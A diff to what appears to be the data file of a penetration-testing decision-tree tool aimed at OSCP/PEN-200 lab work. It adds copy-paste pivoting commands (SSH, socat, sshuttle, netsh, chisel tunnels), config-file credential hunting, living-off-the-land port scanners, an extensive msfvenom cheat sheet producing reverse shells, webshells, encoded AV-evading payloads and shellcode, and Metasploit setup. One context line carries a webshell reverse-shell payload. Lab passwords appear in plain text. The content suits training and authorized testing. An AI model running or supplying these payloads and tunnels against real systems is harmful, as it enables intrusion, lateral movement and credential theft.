@@ -62,6 +62,8 @@ cd ~/results/$ip`,
       { label: "Version # danger reference", next: "version_ref" },
       { label: "Pivoting & tunnels", next: "jump_pivot" },
       { label: "Documentation & reporting", next: "reporting" },
+      { label: "Metasploit (MSF)", next: "msfconsole" },
+      { label: "msfvenom — payload generator", next: "msfvenom" },
       { label: "Back to start", next: "start" },
     ],
   },
@@ -407,21 +409,79 @@ grep -E "80|443|445|22|3389|5985|8080|1433|3306" mass_scan.txt`,
     ],
   },
 
+
+  pivot_calc_link: {
+    phase: "PIVOT",
+    title: "Pivot Calculator",
+    body: "The Pivot Calculator at patha.pages.dev/pivot generates exact commands for your specific IPs and method. Fill in your Kali IP, pivot IPs, target IP and port — get copy-paste ready commands with verify blocks.",
+    cmd: `# Open in browser:
+# patha.pages.dev/pivot
+#
+# Features:
+# - 12 methods: SSH local/dynamic/remote, sshuttle, socat, ligolo, chisel, netsh, plink, ssh.exe
+# - Fill in your IPs → commands auto-generate with your actual values
+# - Auto proxychains4.conf generation for SOCKS methods
+# - Verify commands for each step
+# - Double pivot (second hop) support
+# - Obsidian MD export — copy all commands to your notes
+# - Method wizard — answer 3 questions, get a recommendation`,
+    warn: null,
+    choices: [
+      { label: "Back to pivot methods", next: "pivot_start" },
+      { label: "SSH tunneling", next: "ssh_tunnel" },
+      { label: "Socat / port forward", next: "manual_portfwd" },
+      { label: "Ligolo", next: "ligolo" },
+    ],
+  },
+
   pivot_start: {
     phase: "PIVOT",
     title: "Pivot — Map the Network",
-    body: "You have a foothold. Map what subnets this machine can reach before building any tunnel. The routing table and ARP cache tell you everything.",
-    cmd: `ip a && ip route && arp -a && cat /etc/hosts && ss -tulpn
+    body: "You have a foothold. Map what subnets this machine can reach before building any tunnel. The routing table and ARP cache tell you everything. Use the Pivot Calculator at patha.pages.dev/pivot to generate exact commands for your IPs.",
+    cmd: `# ── STEP 1: CONFIRM YOU HAVE TWO NICS ───────────────
+ip a
+ip route
+# Two interfaces = pivot opportunity
+# Look for: 10.x.x.x, 172.16.x.x, 192.168.x.x on different interfaces
 
-ipconfig /all && route print && arp -a && netstat -ano
+# ── STEP 2: MAP THE INTERNAL NETWORK ─────────────────
+# What subnets can this host reach?
+ip route
+cat /etc/hosts
+arp -a   # hosts already in cache = active recently
 
-export pivot_subnet=172.16.50.0/24`,
+# ── STEP 3: FIND CREDENTIALS ─────────────────────────
+# Config files are gold for pivot creds
+cat /var/atlassian/application-data/confluence/confluence.cfg.xml
+find /var/www /opt /srv /etc -name "*.xml" -o -name "*.conf" -o -name "*.cfg" 2>/dev/null | xargs grep -il "password" 2>/dev/null
+find / -name "*.cfg" -o -name "*.xml" -o -name "*.ini" 2>/dev/null | xargs grep -il "jdbc\|postgres\|mysql\|password" 2>/dev/null
+
+# ── STEP 4: SET VARIABLES ────────────────────────────
+export pivot_subnet=172.16.50.0/24
+export pivot_host=172.16.50.215   # next hop
+export confluence_ip=192.168.50.63  # your current host external IP
+
+# ── STEP 5: CHOOSE YOUR METHOD ───────────────────────
+# Socat available?  → manual_portfwd
+# SSH creds found?  → ssh_tunnel (local or dynamic)
+# Ligolo available? → ligolo
+# No tools?         → pivot_portscan (bash/python scanner)
+
+# Windows equivalent
+ipconfig /all
+route print
+arp -a
+netstat -ano`,
     warn: "Map the full network BEFORE building your tunnel. You need the target subnet first.",
     choices: [
-      { label: "Linux pivot — Ligolo-ng tunnel", next: "ligolo" },
-      { label: "Windows pivot — Ligolo-ng tunnel", next: "ligolo" },
-      { label: "SSH creds to pivot — SSH tunnel", next: "ssh_tunnel" },
-      { label: "Cannot upload tools — socat/netsh", next: "manual_portfwd" },
+      { label: "SSH local/dynamic forward", next: "ssh_tunnel" },
+      { label: "SSH remote forward (firewall blocks inbound)", next: "ssh_tunnel" },
+      { label: "sshuttle — transparent VPN", next: "sshuttle" },
+      { label: "Windows pivot — ssh.exe/plink/netsh", next: "win_portfwd" },
+      { label: "Ligolo-ng tunnel", next: "ligolo" },
+      { label: "Socat port forward", next: "manual_portfwd" },
+      { label: "No tools — bash/python scanner", next: "pivot_portscan" },
+      { label: "⬡ Open Pivot Calculator (generates exact commands)", href: "https://path.jimi421.com/pivot" },
     ],
   },
 
@@ -454,16 +514,81 @@ ping 172.16.50.1`,
     phase: "PIVOT",
     title: "SSH Tunnel",
     body: "SSH creds to the pivot means no binary uploads needed. Dynamic -D gives a full SOCKS5 proxy for proxychains.",
-    cmd: `ssh -D 1080 -N -f user@$ip
-# /etc/proxychains4.conf: socks5 127.0.0.1 1080
-proxychains nmap -sT -p 80,443,445 172.16.50.0/24
+    cmd: `# ── SSH LOCAL PORT FORWARD ───────────────────────────
+# Maps ONE port through the tunnel
+# Run ON the pivot host (e.g. confluence01)
+# Format: -L [local_ip:]local_port:dest_ip:dest_port
 
-ssh -L 8080:172.16.50.5:80 user@$ip -N
-curl http://localhost:8080
+# Forward local port 4455 on pivot → SMB on internal host
+ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
+# Then from Kali: smbclient -p 4455 //[pivot_external_ip]/ -U hr_admin
 
-ssh -R 4444:127.0.0.1:4444 user@$ip -N
+# Forward local port 2345 on pivot → PostgreSQL on internal host
+ssh -N -L 0.0.0.0:2345:10.4.50.215:5432 database_admin@10.4.50.215
+# Then from Kali: psql -h [pivot_ip] -p 2345 -U postgres
 
-ssh -J user@$ip user2@172.16.50.5`,
+# Forward local port 2222 on pivot → SSH on internal host
+ssh -N -L 0.0.0.0:2222:10.4.50.215:22 database_admin@10.4.50.215
+# Then from Kali: ssh database_admin@[pivot_ip] -p 2222
+
+# ── SSH DYNAMIC PORT FORWARD (SOCKS PROXY) ───────────
+# Maps ALL ports through ONE listening SOCKS port
+# Run ON the pivot host
+ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
+
+# Configure proxychains on Kali:
+# Edit /etc/proxychains4.conf — add at bottom:
+# socks5 [pivot_external_ip] 9999
+
+# Then use proxychains to route any tool through:
+proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
+proxychains nmap -sT -Pn -n --top-ports=20 172.16.50.217
+proxychains curl http://172.16.50.100:8080
+
+# Speed up proxychains nmap (lower timeouts in config):
+# tcp_read_time_out 800
+# tcp_connect_time_out 700
+
+# ⚠️  PROXYCHAINS + NMAP LIMITATION — ports may show "filtered"
+# even when open (curl/nc works fine through same proxy)
+# Known issue: proxychains cannot hook nmaps raw socket operations
+# Try --unprivileged flag first:
+proxychains nmap -sT -Pn -n --unprivileged --top-ports=20 $ip
+
+# If still failing — use nc loop instead:
+for port in $(seq 1 1024); do
+  proxychains nc -zv -w1 $ip $port 2>&1 | grep -i "open\|succeeded\|connected"
+done
+
+# Specific range scan (faster):
+for port in $(seq 9050 9100); do
+  proxychains nc -zv -w1 $ip $port 2>&1 | grep -i "open\|succeeded\|connected"
+done
+# Lab validated: PEN-200 Module 19 SSH remote dynamic lab
+# Found port 9062 open on MULTISERVER03 this way
+
+# ── SSH REMOTE PORT FORWARD ───────────────────────────
+# Use when pivot host can reach Kali but Kali can't reach pivot
+# Run ON the pivot host — connects OUT to Kali, creates listener on Kali
+ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@[kali_ip]
+# Kali now has port 2345 locally → connects to internal postgres
+
+# ── SSH REMOTE DYNAMIC (REVERSE SOCKS) ───────────────
+# Run ON the pivot host — creates SOCKS proxy ON Kali
+ssh -N -R 9998 kali@[kali_ip]
+# Add to /etc/proxychains4.conf: socks5 127.0.0.1 9998
+# Then: proxychains nmap -sT -Pn 172.16.50.0/24
+
+# ── CONFIRM TUNNEL IS UP ─────────────────────────────
+ss -ntplu | grep 4455   # check listening on pivot
+ss -ntplu | grep 9999   # check SOCKS proxy port
+
+# ── GOTCHAS ───────────────────────────────────────────
+# -N = no shell opened (normal — no output after password)
+# "Could not create directory /home/x/.ssh" = harmless warning
+# "Failed to add host to known_hosts" = harmless warning
+# Port must be > 1024 if running as non-root
+# -v flag for debug output if tunnel fails`,
     warn: "proxychains + nmap: always -sT. Never -sS through SOCKS — it will hang.",
     choices: [
       { label: "SOCKS proxy up — discover internal hosts", next: "pivot_discovery" },
@@ -475,18 +600,42 @@ ssh -J user@$ip user2@172.16.50.5`,
     phase: "PIVOT",
     title: "Manual Port Forward",
     body: "No binary uploads possible. socat on Linux, netsh on Windows. One port at a time.",
-    cmd: `socat TCP-LISTEN:8080,fork TCP:172.16.50.5:80 &
+    cmd: `# ── SOCAT PORT FORWARD ───────────────────────────────
+# Simplest — run on pivot host, no SSH needed
+# Listen on pivot, forward to internal host
 
-netsh interface portproxy add v4tov4 \\
-  listenaddress=0.0.0.0 listenport=8080 \\
-  connectaddress=172.16.50.5 connectport=80
-netsh interface portproxy show all
-netsh interface portproxy delete v4tov4 \\
-  listenaddress=0.0.0.0 listenport=8080
+# Forward to PostgreSQL
+socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
+# From Kali: psql -h [pivot_ip] -p 2345 -U postgres
 
-iptables -t nat -A PREROUTING -p tcp --dport 8080 \\
-  -j DNAT --to-destination 172.16.50.5:80
-iptables -t nat -A POSTROUTING -j MASQUERADE`,
+# Forward to SSH on internal host
+socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
+# From Kali: ssh user@[pivot_ip] -p 2222
+
+# Forward to SMB
+socat TCP-LISTEN:4455,fork TCP:172.16.50.217:445
+# From Kali: smbclient -p 4455 //[pivot_ip]/ -U user
+
+# Kill socat when done
+kill $(pgrep socat)
+
+# ── RINETD (persistent daemon) ───────────────────────
+# Better for long-term forwards
+# /etc/rinetd.conf format:
+# bindaddress bindport connectaddress connectport
+echo "0.0.0.0 4455 172.16.50.217 445" >> /etc/rinetd.conf
+service rinetd restart
+
+# ── NETCAT + FIFO (if socat not available) ────────────
+mkfifo /tmp/pivot
+nc -lnvp 4455 < /tmp/pivot | nc 172.16.50.217 445 > /tmp/pivot
+
+# ── IPTABLES (root required) ──────────────────────────
+# Enable forwarding
+echo 1 > /proc/sys/net/ipv4/ip_forward
+# Forward incoming port 4455 to internal host
+iptables -t nat -A PREROUTING -p tcp --dport 4455 -j DNAT --to-destination 172.16.50.217:445
+iptables -A FORWARD -p tcp -d 172.16.50.217 --dport 445 -j ACCEPT`,
     warn: null,
     choices: [
       { label: "Port forwarded — access service on Kali", next: "web_enum" },
@@ -494,25 +643,180 @@ iptables -t nat -A POSTROUTING -j MASQUERADE`,
     ],
   },
 
-  chisel: {
+  sshuttle: {
     phase: "PIVOT",
-    title: "Chisel Tunnel",
-    body: "Chisel runs over HTTP — works when direct TCP is blocked by firewall. Server on Kali, client on pivot.",
-    cmd: `./chisel server -p 8080 --reverse --socks5
+    title: "sshuttle — VPN-like Tunnel",
+    body: "sshuttle turns SSH into a transparent VPN. No proxychains needed — route whole subnets through SSH directly. Requires root on Kali and Python3 on SSH server.",
+    cmd: `# ── REQUIREMENTS ─────────────────────────────────────
+# Root on Kali (sudo)
+# Python3 on SSH server
+# Direct SSH access to pivot host
 
-./chisel client $lhost:8080 R:socks
-.\\chisel.exe client $lhost:8080 R:socks
+# ── BASIC USAGE ───────────────────────────────────────
+# Route internal subnet through pivot
+sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
+# After this — connect directly to internal hosts, no proxychains:
+smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
+psql -h 10.4.50.215 -U postgres
 
-proxychains nmap -sT -p- 172.16.50.5
+# ── WITH SOCAT PORT FORWARD (no direct SSH to pivot) ──
+# First set up socat on pivot (port 2222 → internal SSH port 22)
+# socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
+# Then sshuttle through that forward:
+sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
 
-./chisel client $lhost:8080 R:3306:172.16.50.5:3306`,
-    warn: "proxychains + nmap: always -sT. UDP and ICMP do not traverse SOCKS.",
+# ── ROUTE ALL TRAFFIC ─────────────────────────────────
+sshuttle -r user@pivot 0/0   # routes everything (careful)
+
+# ── EXCLUDE SUBNETS ───────────────────────────────────
+sshuttle -r user@pivot 10.4.50.0/24 -x 10.4.50.215  # exclude pivot itself
+
+# ── DNS THROUGH TUNNEL ────────────────────────────────
+sshuttle -r user@pivot --dns 10.4.50.0/24
+
+# ── IGNORE HOST KEY ───────────────────────────────────
+sshuttle -r user@pivot --ssh-cmd "ssh -o StrictHostKeyChecking=no" 10.4.50.0/24
+
+# ── TROUBLESHOOT ─────────────────────────────────────
+# "Failed to flush caches" = harmless DNS warning, ignore
+# If connection drops — restart sshuttle
+# Not working? check Python3 is on the remote host: python3 --version`,
+    warn: "sshuttle requires root on Kali and Python3 on the SSH server. Not stealthy — creates routing table changes. Clean up when done. Lab validated: PEN-200 Module 19.",
     choices: [
-      { label: "Tunnel up — discover internal hosts", next: "pivot_discovery" },
-      { label: "Tunnel up — scan internal target", next: "pivot_portscan" },
+      { label: "Tunneling — scan internal hosts directly", next: "pivot_portscan" },
+      { label: "Back to pivot methods", next: "pivot_start" },
     ],
   },
 
+  win_portfwd: {
+    phase: "PIVOT",
+    title: "Windows Port Forwarding",
+    body: "Three methods depending on what's available: ssh.exe (modern Windows), Plink (older/OpenSSH removed), Netsh (native, needs admin). Each has tradeoffs.",
+    cmd: `# ── CHECK WHAT'S AVAILABLE ───────────────────────────
+where ssh         # OpenSSH client (Windows 10 1803+)
+ssh.exe -V        # needs to be >= 7.6 for remote dynamic
+where plink       # PuTTY CLI client
+
+# ── SSH.EXE — same syntax as Linux OpenSSH ────────────
+# Remote dynamic (SOCKS proxy on Kali):
+ssh -N -R 9998 kali@$lhost
+# Remote port forward (single port):
+ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@$lhost
+# Then from Kali: proxychains nmap / psql / smbclient etc
+
+# ── PLINK — when OpenSSH removed ─────────────────────
+# Download to target:
+# powershell wget -Uri http://$lhost/plink.exe -OutFile C:\Windows\Temp\plink.exe
+# (copy plink.exe from /usr/share/windows-resources/binaries/ to apache2 root)
+
+# Remote port forward with Plink:
+C:\Windows\Temp\plink.exe -ssh -l kali -pw <password> -R 127.0.0.1:9833:127.0.0.1:3389 $lhost
+
+# Plink in non-TTY shell (pipe y to accept host key):
+cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l kali -pw <password> -R 127.0.0.1:9833:127.0.0.1:3389 $lhost
+
+# NOTE: Plink does NOT support remote dynamic port forwarding
+# Use ssh.exe for SOCKS proxy, plink only for single-port forwards
+
+# ── NETSH — native Windows, needs admin ──────────────
+# Create port forward:
+netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
+
+# Verify:
+netsh interface portproxy show all
+netstat -anp TCP | find "2222"
+
+# Open firewall hole (required or port appears filtered):
+netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
+
+# From Kali — connect through netsh forward:
+ssh database_admin@192.168.50.64 -p2222
+
+# ── CLEANUP — ALWAYS DO THIS ─────────────────────────
+# Delete firewall rule:
+netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
+# Delete port forward:
+netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64`,
+    warn: "Netsh requires admin privileges and leaves artifacts (firewall rules + portproxy entries). Always clean up. Plink exposes password on command line — risky in hostile environments. ssh.exe needs version >= 7.6 for remote dynamic.",
+    choices: [
+      { label: "Set up SOCKS proxy on Kali", next: "ssh_tunnel" },
+      { label: "Scan internal network", next: "pivot_portscan" },
+      { label: "Back to pivot start", next: "pivot_start" },
+    ],
+  },
+
+  chisel: {
+    phase: "PIVOT",
+    title: "Chisel — HTTP Tunneling",
+    body: "Chisel encapsulates traffic in HTTP — bypasses Deep Packet Inspection that blocks SSH/raw TCP. Uses SSH protocol inside the HTTP tunnel so traffic is encrypted. Client/server model with reverse SOCKS proxy.",
+    cmd: `# ── SETUP ON KALI ────────────────────────────────────
+# Start chisel server with reverse tunnel enabled
+chisel server --port 8080 --reverse
+# Listening on http://0.0.0.0:8080
+
+# Serve chisel binary via Apache for target to download
+sudo cp $(which chisel) /var/www/html/
+sudo systemctl start apache2
+
+# ── GLIBC VERSION MISMATCH FIX ───────────────────────
+# If target gets: "GLIBC_2.32/2.34 not found" error
+# = Kali chisel compiled with Go 1.20+ won't run on older targets
+# Fix: use chisel 1.8.1 compiled with Go 1.19:
+wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
+gunzip chisel_1.8.1_linux_amd64.gz
+mv chisel_1.8.1_linux_amd64 chisel
+sudo cp chisel /var/www/html/
+
+# ── DEBUG — capture error output from target ─────────
+# If chisel client fails silently, use this to get error back:
+/tmp/chisel client $lhost:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://$lhost:8080/
+# tcpdump on Kali will show the error in the POST body:
+sudo tcpdump -nvvvXi tun0 tcp port 8080
+
+# ── TRANSFER + RUN CLIENT ON TARGET ──────────────────
+# Download on target:
+wget http://$lhost/chisel -O /tmp/chisel && chmod +x /tmp/chisel
+
+# Start chisel client (reverse SOCKS):
+/tmp/chisel client $lhost:8080 R:socks > /dev/null 2>&1 &
+
+# Verify on Kali — SOCKS proxy port 1080 should appear:
+ss -ntlp | grep 1080
+# tcp LISTEN 127.0.0.1:1080 = tunnel up
+
+# ── USE THE SOCKS PROXY ───────────────────────────────
+# Update proxychains config:
+# socks5 127.0.0.1 1080
+
+# Run tools through proxychains:
+proxychains nmap -sT -Pn -n --top-ports=20 10.4.50.215
+proxychains smbclient -L //172.16.50.217/ -U hr_admin
+
+# ── SSH THROUGH CHISEL SOCKS PROXY ────────────────────
+# Standard nc doesn't support SOCKS — install ncat:
+sudo apt install ncat
+
+# SSH via SOCKS proxy using ncat ProxyCommand:
+ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
+# %h %p = SSH fills in host and port automatically
+
+# ── SINGLE PORT FORWARD (no SOCKS) ───────────────────
+# Forward specific port instead of full SOCKS:
+# On target:
+/tmp/chisel client $lhost:8080 R:4455:172.16.50.217:445
+# Kali now has localhost:4455 → internal target:445
+
+# ── WINDOWS TARGET ────────────────────────────────────
+# Download matching architecture binary from GitHub releases
+# Run same commands with .exe:
+.\\chisel.exe client $lhost:8080 R:socks`,
+    warn: "Chisel compiled with Go 1.20+ will fail on Ubuntu 20.04/older targets (GLIBC mismatch). Download chisel 1.8.1 from GitHub releases (Go 1.19 compiled) instead of using Kali's built-in version. Lab validated: PEN-200 Module 20.",
+    choices: [
+      { label: "SOCKS proxy up — scan internal network", next: "pivot_portscan" },
+      { label: "SOCKS proxy up — use proxychains", next: "ssh_tunnel" },
+      { label: "Back to pivot methods", next: "pivot_start" },
+    ],
+  },
   pivot_discovery: {
     phase: "PIVOT",
     title: "Internal Host Discovery",
@@ -542,17 +846,72 @@ sort -u pivot_hosts.txt > internal_live.txt`,
     phase: "PIVOT",
     title: "Port Scan Through Tunnel",
     body: "Ligolo: treat like a direct connection. Proxychains: -sT required, lower rate. Never -sS through SOCKS.",
-    cmd: `nmap -p- --min-rate 2000 -T3 172.16.50.5 -oN pivot_allports.txt
-nmap -p <PORTS> -sC -sV 172.16.50.5 -oN pivot_targeted.txt
+    cmd: `# ── WITH NMAP / PROXYCHAINS ──────────────────────────
+proxychains nmap -sT -p 22,80,139,443,445,3389,5985,8080 172.16.50.5 --open
+nmap -p- --min-rate 2000 -T3 172.16.50.5 -oN pivot_allports.txt
 
-proxychains nmap -sT -p 80,443,445,22,3389,5985,1433,3306 \\
-  172.16.50.5 --open -T2
-proxychains curl -sv http://172.16.50.5
+# ── NO NMAP — LIVING OFF THE LAND ────────────────────
+# Run directly on pivot host — no tools needed
+# Lab validated: Confluence box behind DMZ
 
-for host in $(cat internal_live.txt); do
-  nmap -p 80,443,445,22,3389,5985,8080 \\
-    --open $host -oN pivot_$host.txt
-done`,
+# nc — single port sweep
+for i in $(seq 1 254); do
+  nc -zv -w 1 172.16.50.$i 445 2>&1 | grep -v refused | grep -v timed
+done
+
+# ⚠️  PROXYCHAINS + NMAP 4.17 BUG
+# If nmap through proxychains shows all ports "filtered" but curl/nc works
+# = proxychains 4.17 bug, not a firewall issue
+# Use nc loop THROUGH proxychains instead:
+for port in $(seq 9050 9100); do
+  proxychains nc -zv -w1 $ip $port 2>&1 | grep -i "open\|succeeded\|connected"
+done
+# Lab: found port 9062 on MULTISERVER03 this way — PEN-200 Module 19
+
+# nc — multi-port clean output
+for i in $(seq 1 254); do
+  for p in 22 80 139 443 445 3389 5985 8080 1433 3306; do
+    r=$(nc -zv -w 1 172.16.50.$i $p 2>&1)
+    echo $r | grep -q "open\|succeeded" && echo "OPEN: 172.16.50.$i:$p"
+  done
+done
+
+# /dev/tcp — bash builtin, no nc needed
+for i in $(seq 1 254); do
+  for p in 22 80 445 3389 5985 8080; do
+    (echo >/dev/tcp/172.16.50.$i/$p) 2>/dev/null && echo "OPEN: 172.16.50.$i:$p"
+  done
+done
+
+# Python3 — threaded, fastest option
+# copy-paste this block directly into the shell:
+python3 -c "
+import socket,concurrent.futures
+subnet,ports="172.16.50",[22,80,139,443,445,1433,3306,3389,5985,8080,8443]
+def scan(h,p):
+  try:
+    s=socket.socket();s.settimeout(0.5);s.connect((h,p));s.close();print(f"OPEN:{h}:{p}")
+  except:pass
+with concurrent.futures.ThreadPoolExecutor(max_workers=100) as e:
+  [e.submit(scan,f"{subnet}.{i}",p) for i in range(1,255) for p in ports]
+"
+
+# Python2 fallback
+python -c "import socket
+subnet="172.16.50"
+ports=[22,80,445,3389,5985,8080]
+for i in range(1,255):
+  for p in ports:
+    try:
+      s=socket.socket();s.settimeout(0.5);s.connect((subnet+"."+str(i),p));s.close();print("OPEN:"+subnet+"."+str(i)+":"+str(p))
+    except:pass
+"
+
+# Windows PowerShell
+# 1..254|%{$i=$_;@(22,80,445,3389,5985,8080)|%{$t=New-Object Net.Sockets.TcpClient;try{$t.Connect("172.16.50.$i",$_);if($t.Connected){Write-Host "OPEN:172.16.50.$i:$_"};$t.Close()}catch{}}}
+
+# Update subnet variable first:
+# subnet="172.16.50" in python, or change the for loop IP range`,
     warn: "Never -sS through proxychains. Always -sT.",
     choices: [
       { label: "Found internal web", next: "web_enum" },
@@ -3470,6 +3829,503 @@ curl "http://$ip/wp-content/themes/theme/404.php?cmd=bash+-c+'bash+-i+>%26+/dev/
     ],
   },
 
+
+
+  msfvenom: {
+    phase: "EXPLOIT",
+    title: "msfvenom — Payload Generator",
+    body: "Generate shellcode, executables, web shells, and encoded payloads for every platform and architecture. Key flags: -p payload, -f format, -o output, -e encoder, -i iterations, -b bad chars.",
+    cmd: `# ── SEARCH PAYLOADS ──────────────────────────────────
+msfvenom -l payloads                                    # list all payloads
+msfvenom -l payloads | grep windows                    # filter by platform
+msfvenom -l payloads | grep linux                      # linux payloads
+msfvenom -l payloads | grep php                        # php payloads
+msfvenom -l payloads | grep python                     # python payloads
+msfvenom -l payloads --platform windows --arch x64     # platform + arch filter
+msfvenom -l payloads --platform windows --arch x86     # 32-bit windows
+msfvenom -l payloads --platform linux --arch x64       # 64-bit linux
+msfvenom -l payloads --platform osx                    # macOS payloads
+msfvenom -l formats                                    # list output formats
+msfvenom -l encoders                                   # list encoders
+
+# ── PAYLOAD NAMING CONVENTION ─────────────────────────
+# shell_reverse_tcp     = non-staged (all-in-one, more stable)
+# shell/reverse_tcp     = staged (small first stage, needs handler)
+# meterpreter_reverse_tcp = meterpreter non-staged
+# meterpreter/reverse_tcp = meterpreter staged
+
+# ── WINDOWS PAYLOADS ──────────────────────────────────
+# Non-staged reverse shell (x64):
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f exe -o shell.exe
+
+# Non-staged reverse shell (x86/32-bit):
+msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=443 -f exe -o shell32.exe
+
+# Staged reverse shell (needs multi/handler):
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=$lhost LPORT=443 -f exe -o staged.exe
+
+# Meterpreter HTTPS non-staged (stealthiest):
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=$lhost LPORT=443 -f exe -o met.exe
+
+# Meterpreter TCP non-staged:
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$lhost LPORT=4444 -f exe -o met_tcp.exe
+
+# Meterpreter staged:
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=443 -f exe -o met_staged.exe
+
+# PowerShell format:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f ps1 -o shell.ps1
+
+# DLL payload:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f dll -o shell.dll
+
+# ASP webshell (IIS):
+msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=443 -f asp -o shell.asp
+
+# ASPX webshell:
+msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=443 -f aspx -o shell.aspx
+
+# ── LINUX PAYLOADS ────────────────────────────────────
+# ELF reverse shell (x64):
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f elf -o shell.elf
+chmod +x shell.elf
+
+# ELF reverse shell (x86):
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=$lhost LPORT=443 -f elf -o shell32.elf
+
+# Meterpreter Linux x64:
+msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$lhost LPORT=443 -f elf -o met.elf
+
+# Bind shell (target connects to itself — no LHOST needed):
+msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f elf -o bind.elf
+
+# ── PHP PAYLOADS ──────────────────────────────────────
+# PHP reverse shell (most compatible):
+msfvenom -p php/reverse_php LHOST=$lhost LPORT=443 -f raw > shell.php
+# Bypass extension filter:
+cp shell.php shell.pHP                                 # Windows/XAMPP case-insensitive
+
+# PHP Meterpreter:
+msfvenom -p php/meterpreter_reverse_tcp LHOST=$lhost LPORT=443 -f raw > met.php
+
+# PHP bind shell:
+msfvenom -p php/bind_php LPORT=4444 -f raw > bind.php
+
+# ── PYTHON / OTHER SCRIPT PAYLOADS ───────────────────
+# Python reverse shell:
+msfvenom -p python/shell_reverse_tcp LHOST=$lhost LPORT=443 -f raw > shell.py
+
+# Bash reverse shell:
+msfvenom -p cmd/unix/reverse_bash LHOST=$lhost LPORT=443 -f raw > shell.sh
+
+# Perl reverse shell:
+msfvenom -p cmd/unix/reverse_perl LHOST=$lhost LPORT=443 -f raw > shell.pl
+
+# Java WAR file (Tomcat/JBoss):
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lhost LPORT=443 -f war -o shell.war
+
+# JSP shell:
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lhost LPORT=443 -f raw > shell.jsp
+
+# ── SHELLCODE (for BOF / custom exploits) ─────────────
+# Raw shellcode (C array format):
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f c
+
+# Raw shellcode (Python format):
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f python
+
+# Raw shellcode (hex):
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f hex
+
+# ── BAD CHARACTERS / ENCODING ─────────────────────────
+# Exclude bad characters (common in BOF):
+msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=443 -f exe -b "\x00\x0a\x0d" -o shell.exe
+
+# Encode with shikata_ga_nai (AV evasion — limited effectiveness):
+msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=443 -f exe -e x86/shikata_ga_nai -i 5 -o encoded.exe
+
+# Encode for x64:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f exe -e x64/xor -i 3 -o encoded64.exe
+
+# ── CATCH THE SHELL ────────────────────────────────────
+# Non-staged → nc works fine:
+nc -nlvp 443
+
+# Staged or Meterpreter → needs multi/handler:
+# msfconsole → use multi/handler
+# set payload windows/x64/shell/reverse_tcp
+# set LHOST $lhost
+# set LPORT 443
+# run
+
+# Keep handler alive for multiple connections:
+# set ExitOnSession false
+# run -j`,
+    warn: "Port 4444 is default and commonly blocked — use 443 or 80 instead. Staged payloads (shell/reverse_tcp with /) need multi/handler, NOT nc. Shikata_ga_nai encoder won't bypass modern AV — useful for bad char avoidance not evasion. On OSCP: Metasploit/msfvenom allowed on ONE machine only.",
+    choices: [
+      { label: "Catch shell — multi/handler setup", next: "msfconsole" },
+      { label: "Upload shell — web application", next: "file_upload" },
+      { label: "Transfer payload to target", next: "transfer_agnostic" },
+      { label: "BOF — need shellcode format", next: "bof" },
+    ],
+  },
+
+  msfconsole: {
+    phase: "EXPLOIT",
+    title: "Metasploit Framework (MSF)",
+    body: "Full exploit framework — search, exploit, Meterpreter, post-exploitation, pivoting. OSCP: auxiliary modules are UNRESTRICTED — use freely for scanning/enum/brute force. Exploit modules limited to ONE machine only.",
+    cmd: `# ── SETUP ────────────────────────────────────────────
+sudo msfdb init                    # initialize PostgreSQL db (first time)
+sudo systemctl enable postgresql   # enable on boot
+sudo msfconsole -q                 # start quiet (no banner)
+db_status                          # confirm db connected
+
+# ── WORKSPACES ────────────────────────────────────────
+workspace                          # list workspaces
+workspace -a pen200                # create + switch to new workspace
+workspace pen200                   # switch to existing
+
+# ── RECON / DB ────────────────────────────────────────
+db_nmap -A 192.168.50.202          # nmap + save to db
+db_nmap -sV -p- 192.168.50.0/24   # full port scan whole subnet
+hosts                              # list discovered hosts
+hosts -R                           # set RHOSTS from all discovered hosts
+services                           # list all discovered services
